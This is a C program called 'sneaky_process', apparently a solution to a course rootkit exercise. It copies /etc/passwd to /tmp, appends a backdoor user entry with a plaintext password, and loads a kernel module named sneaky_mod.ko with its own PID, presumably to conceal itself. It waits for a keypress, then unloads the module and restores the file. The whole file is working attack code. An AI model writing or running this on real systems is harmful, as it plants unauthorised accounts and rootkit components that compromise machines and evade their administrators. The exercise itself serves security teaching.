#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>

void run_command(const char *cmd, char *const argv[]) {
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(1);
    } else if (pid == 0) {
        // Child process
        execvp(cmd, argv);
        perror("execvp");
        exit(1);
    } else {
        // Parent process
        int status;
        waitpid(pid, &status, 0);
    }
}

int main() {
    // SP-1: Print PID
    pid_t mypid = getpid();
    printf("sneaky_process pid = %d\n", mypid);
    fflush(stdout);

    // SP-2: Backup password file
    char *cp1_argv[] = {"cp", "/etc/passwd", "/tmp/passwd", NULL};
    run_command("cp", cp1_argv);

    // SP-3: Append backdoor user
    FILE *f = fopen("/etc/passwd", "a");
    if (f) {
        fprintf(f, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
        fclose(f);
    }

    // SP-4: Load kernel module with current PID
    char pid_str[32];
    snprintf(pid_str, sizeof(pid_str), "%d", mypid);
    char *insmod_argv[] = {"insmod", "sneaky_mod.ko", NULL, NULL};
    char param_str[64];
    snprintf(param_str, sizeof(param_str), "pid=%d", mypid);
    insmod_argv[2] = param_str;
    run_command("insmod", insmod_argv);

    // SP-5: Loop until 'q' is received
    int c;
    while ((c = getchar()) != 'q') {
        // keep looping
    }

    // SP-6: Unload kernel module
    char *rmmod_argv[] = {"rmmod", "sneaky_mod", NULL};
    run_command("rmmod", rmmod_argv);

    // SP-7: Restore password file
    char *cp2_argv[] = {"cp", "/tmp/passwd", "/etc/passwd", NULL};
    run_command("cp", cp2_argv);

    return 0;
}
